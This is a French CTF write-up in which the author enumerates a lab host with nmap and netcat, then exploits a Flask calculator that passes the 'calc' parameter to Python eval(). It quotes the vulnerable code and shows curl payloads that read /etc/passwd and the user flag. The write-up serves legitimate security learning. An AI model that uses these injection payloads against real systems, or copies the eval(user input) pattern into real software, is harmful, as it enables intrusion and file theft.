# Exegol Challenge --- Year 5739

## Objectif

Trouver le flag `user.txt` sur la machine cible.

Cible :

```text
10.10.0.3
```

## 1. Énumération des ports

Un scan Nmap classique n'a trouvé aucun service ouvert, j'ai donc scanné tous les ports TCP :

```bash
nmap -Pn -p- --min-rate 3000 10.10.0.3
```

- `-Pn` : ignore la découverte de l'hôte et considère que la machine est en ligne.

- `-p-` : scanne les 65 535 ports TCP.

- `--min-rate 3000` : augmente la vitesse minimale du scan.

Résultat :

```text
5739/tcp open
```

Le challenge s'appelle **Year 5739**, donc le port `5739` semblait intéressant à examiner.

## 2. Identification du service

Je me suis connecté au port avec Netcat :

```bash
echo "hello" | timeout 10 nc -nv 10.10.0.3 5739
```

La réponse contenait :

```text
400 Bad Request
```

Cela indiquait que le service était un serveur HTTP : `hello` était interprété comme une requête HTTP invalide.

J'ai ensuite envoyé une requête HTTP correcte :

```bash
curl http://10.10.0.3:5739/
```

La page contenait une calculatrice utilisant un paramètre GET appelé `calc` :

```html
<input type="text" name="calc" placeholder="24*60*60">
```

Il y avait également un commentaire HTML mentionnant une backdoor utilisant Python.

## 3. Recherche de l'injection

J'ai testé la calculatrice avec des expressions Python :

```bash
curl -sG 'http://10.10.0.3:5739/' \
  --data-urlencode 'calc=2+2'
```

Cela a retourné :

```text
4
```

D'autres expressions comme `2**10` et `(2+3)*4` étaient également évaluées.

L'application évaluait donc le contenu du paramètre `calc` comme du code Python.

J'ai ensuite trouvé la partie concernée de l'application Flask :

```python
calc = request.args.get('calc') or "24*60*60"

try:
    return render_template('index.html', name=calc, calc=eval(calc))
except:
    return render_template('index.html', name="24*60*60", calc=eval("24*60*60"))
```

La vulnérabilité est :

```python
eval(calc)
```

Une entrée contrôlée par l'utilisateur est directement transmise à la fonction `eval()` de Python.

## 4. Lecture des fichiers

Comme les expressions Python étaient évaluées, j'ai utilisé `open()` pour lire des fichiers présents sur le serveur :

```bash
curl -sG 'http://10.10.0.3:5739/' \
  --data-urlencode "calc=open('/etc/passwd').read()"
```

Le fichier `/etc/passwd` a révélé plusieurs utilisateurs, notamment :

```text
senku
cave-of-miracles
true-secret
```

L'entrée de `senku` indiquait que son répertoire personnel était :

```text
/home/senku
```

## 5. Recherche du flag

J'ai ensuite essayé l'emplacement habituel d'un flag utilisateur :

```bash
curl -sG 'http://10.10.0.3:5739/' \
  --data-urlencode "calc=open('/home/senku/user.txt').read()"
```

Cela a retourné le contenu de `user.txt` et m'a permis de terminer le challenge.

## Commandes / concepts à retenir

```bash
# Scanner tous les ports TCP

nmap -Pn -p- TARGET

# Se connecter manuellement à un service TCP

nc -nv TARGET PORT

# Envoyer une requête à un service HTTP

curl http://TARGET:PORT/

# Envoyer un paramètre GET avec encodage URL

curl -sG URL --data-urlencode "parameter=value"
```